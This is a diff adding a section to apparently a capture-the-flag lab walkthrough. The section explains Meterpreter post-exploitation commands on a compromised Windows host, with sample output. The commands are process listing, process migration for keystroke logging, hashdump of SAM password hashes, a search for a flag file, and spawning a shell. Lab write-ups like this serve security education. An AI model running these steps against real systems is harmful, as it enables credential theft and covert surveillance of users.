@@ -485,8 +485,47 @@ Core Commands
 meterpreter > getuid
 Server username: NT AUTHORITY\SYSTEM
 meterpreter >
+```  
+`ps`: list of running processes  
 ```
+meterpreter > ps
 
+Process List
+============
+
+ PID   PPID  Name                  Arch  Session  User                          Path
+ ---   ----  ----                  ----  -------  ----                          ----
+ 0     0     [System Process]                                                   
+ 4     0     System                x64   0                                      
+ 396   644   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           
+```  
+`migrate`: Migrating to another process will help Meterpreter interact with it. For example, if you see a word processor running on the target (e.g. word.exe, notepad.exe, etc.), you can migrate to it and start capturing keystrokes sent by the user to this process. Some Meterpreter versions will offer you the `keyscan_start`, `keyscan_stop`, and `keyscan_dump` command options to make Meterpreter act like a keylogger. Migrating to another process may also help you to have a more stable Meterpreter session.  
+```
+meterpreter > migrate 716
+[*] Migrating from 1304 to 716...
+[*] Migration completed successfully.
+```  
+`hashdump`: list the content of the SAM database  
+```
+meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+```  
+`search`: locate files with potentially juicy information  
+```
+meterpreter > search -f flag2.txt
+Found 1 result...
+    c:\Windows\System32\config\flag2.txt (34 bytes)
+```  
+`shell`: launch a regular command-line shell on the target system. Pressing `CTRL+Z` will help you go back to the Meterpreter shell.  
+```
+meterpreter > shell
+Process 2124 created.
+Channel 1 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+```  
 
 
 
